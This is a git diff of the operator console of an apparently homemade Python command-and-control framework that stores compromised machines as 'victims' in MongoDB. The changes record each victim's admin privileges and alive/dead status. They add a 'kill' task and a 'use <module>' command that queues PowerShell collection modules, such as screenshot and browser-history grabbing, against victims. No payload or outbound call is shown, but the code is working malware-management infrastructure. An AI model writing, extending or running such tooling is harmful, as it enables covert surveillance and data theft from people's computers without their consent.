@@ -3,8 +3,10 @@ import pdb
 import random
 import string
 from lib.task import Task
+from lib.module import Module
 from termcolor import colored
 import readline
+import re
 
 
 class Victim:
@@ -13,12 +15,13 @@ class Victim:
 	victims = {}
 	module_hash = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
 
-	def __init__(self,victim_id,platform,os_version,lastseen = datetime.datetime.now(),add_db = True):
+	def __init__(self,victim_id,platform,os_version,admin,status = 'Alive',lastseen = datetime.datetime.now(),add_db = True):
 		self.victim_id = victim_id
 		self.platform = platform
 		self.os_version = os_version
+		self.admin = admin
 		self.lastseen = lastseen
-
+		self.status = status
 		self.victims[self.victim_id] = self
 		self.modules = self.module_hash[self.platform]
 		self.tasks = {}
@@ -37,7 +40,8 @@ class Victim:
 		print('--------------------------------------')
 		print('|          VICTIM HELP MENU           |')
 		print('--------------------------------------')
-		commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','back': 'Go back to main menu.'}
+		commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','kill': 
+		'Kill Victim', 'back': 'Go back to main menu.'}
 
 		for command in commands.keys():
 			print(colored(command,'cyan') + " - " + commands[command])
@@ -52,19 +56,20 @@ class Victim:
 
 		for victim in victim_list:
 			if ('sample' not in victim) and (victim['victim_id'] not in Victim.victims.keys()):
-				Victim(victim['victim_id'],victim['platform'],victim['os_version'],victim['lastseen'],False)
+				Victim(victim['victim_id'],victim['platform'],victim['os_version'],victim['admin'],victim['status'],victim['lastseen'],False)
 
 
-	## Gets the last seen of the victim. If lastseen > 60secs, vicitim considered dead.
+	## Gets the last seen and status of the victim. If lastseen > 60secs, vicitim considered dead.
 	def get_victim_health_status(self):
 		time = datetime.datetime.now() - self.lastseen
 		if time.total_seconds() > 60:
-			print("Victim Dead. Seen "+str(time.total_seconds())+" secs ago.")
-		else:
-			print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")
+			self.status = 'Dead'
+		print(f"{colored('Status','cyan')} - {self.status}")
 
-	## Called from main side, to update the last seen according to db
-	def update_last_seen_from_db(self):
+		print("Seen "+str(time.total_seconds())+" secs ago.")
+
+	## Called from main side, to update the last seen and status according to db
+	def update_last_seen_status_from_db(self):
 		mydb = self.mongoclient["pythonc2"]
 		victims = mydb["victims"]
 		h = {'victim_id':self.victim_id}
@@ -73,17 +78,20 @@ class Victim:
 
 		if victim:
 			self.lastseen = victim['lastseen']
+			self.status = victim['status']
 
 	## Gets the various info of the victim. Trigerred by the info command.
 	def get_victim_info(self):
-		self.update_last_seen_from_db()
-		print(f"{colored('ID','cyan')} - {self.victim_id} \n{colored('Platform','cyan')} - {self.platform} \n{colored('OS Version','cyan')} - {self.os_version} \n{colored('lastseen','cyan')} - {self.lastseen}")
+		self.update_last_seen_status_from_db()
+		print(f"{colored('ID','cyan')} - {self.victim_id} \n{colored('Platform','cyan')} - {self.platform} \n{colored('OS Version','cyan')} - {self.os_version} \n{colored('Admin Privileges','cyan')} - {self.admin} \n{colored('lastseen','cyan')} - {self.lastseen}")
 		self.get_victim_health_status()
 
-	def show_tasks(self):\
-		## TODO - update from db before showing if you want output or issuance status
+	def show_tasks(self):
+		if not self.tasks:
+			print(colored('No tasks to show','yellow'))
 		for key in self.tasks.keys():
 			task_obj = self.tasks[key]
+			task_obj.update_task_from_db()
 			print(f"{colored('Task ID','cyan')} - {task_obj.task_id} \n{colored('Command','cyan')} - {task_obj.command} \n{colored('Command Output','cyan')} - {task_obj.output} \n{colored('Issued','cyan')} - {task_obj.issued}")
 
 
@@ -101,13 +109,6 @@ class Victim:
 			elif cmd == 'modules':
 				print(self.modules)
 
-			elif cmd == 'getfiles' or cmd == 'screenshot' or cmd == 'browser_history':
-				if cmd in self.modules:
-					task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
-					task = Task(victim_id = self.victim_id ,command = cmd,task_id = task_id)
-					self.tasks[task.task_id] = task
-				else:
-					print('Command not supported. See the supported ones by running modules command')
 			elif cmd ==  'tasks':
 				self.show_tasks()
 			elif cmd == 'back' or cmd == 'exit':
@@ -116,7 +117,39 @@ class Victim:
 
 			elif cmd == 'help':
 				self.display_victim_help_menu()
+			elif cmd == 'kill':
 
+				## Creates a task with the command kill
+				task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
+				task = Task(victim_id = self.victim_id ,command = 'kill',options = {}, task_id = task_id)
+				self.tasks[task.task_id] = task
+
+			elif re.match(r'^use .*$',cmd):
+
+				## Before trying to assign task, see if victim alive
+				self.update_last_seen_status_from_db()
+				if self.status == 'Dead':
+					print(colored("Sorry victim dead, can't assign task",'yellow'))
+					continue
+
+				module = re.findall(r'^use (.*)$',cmd)[0]
+				if module in self.modules:
+					language = 'powershell'
+					utility = 'collection'
+					Module.show_options(module,utility)
+
+					## Gets the paramters for a module which user might customize
+					option_hash = Module.module_menu(module,utility)
+
+					## In case user does not want to run module, option hash will be False else it will be a dictionary
+					if option_hash != False:
+						task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
+						task = Task(victim_id = self.victim_id ,command = module,options = option_hash, task_id = task_id)
+						self.tasks[task.task_id] = task
+
+				else:
+					## TODO- add to logger
+					print(colored('Not a valid module. See the supported modules by running the "modules" command','yellow'))
 			else:
 				print("Not supported")
 
@@ -125,7 +158,7 @@ class Victim:
 		mydb = self.mongoclient["pythonc2"]
 		victims = mydb["victims"]
 
-		h = {'victim_id' : self.victim_id, 'platform' : self.platform ,'os_version' : self.os_version, 'lastseen' : self.lastseen}
+		h = {'victim_id' : self.victim_id, 'platform' : self.platform ,'os_version' : self.os_version, 'admin': self.admin, 'status': self.status, 'lastseen' : self.lastseen}
 
 		victims.insert_one(h)
 
@@ -142,7 +175,7 @@ class Victim:
 
 
 	## Updates last seen whenever a new request is seen from the victim
-	def update_last_seen_to_db(self):
+	def update_last_seen_status_to_db(self):
 		time = datetime.datetime.now()
 
 		self.lastseen = time
@@ -151,7 +184,7 @@ class Victim:
 		mydb = self.mongoclient["pythonc2"]
 		victims = mydb["victims"]
 		h = {'victim_id':self.victim_id}
-		victims.find_one_and_update(h,{ "$set": { "lastseen": time } })
+		victims.find_one_and_update(h,{ "$set": { "lastseen": time , "status": self.status} })
 
 
 class WindowsVictim(Victim):
